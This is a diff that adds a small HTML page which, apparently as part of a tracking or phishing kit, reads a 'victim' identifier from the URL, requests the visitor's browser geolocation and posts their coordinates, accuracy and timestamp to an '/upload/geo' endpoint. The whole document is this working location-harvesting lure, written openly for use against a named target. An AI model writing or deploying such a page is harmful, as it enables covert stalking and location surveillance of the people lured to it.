@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Geo</title>
+</head>
+<body>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const victim = params.get('victim');
+
+    navigator.geolocation.getCurrentPosition(pos => {
+      const data = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        timestamp: Date.now(),
+        victim: victim
+      };
+
+      fetch('/upload/geo', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      }).then(() => {
+        alert('Location sent');
+      });
+    });
+  </script>
+</body>
+</html>
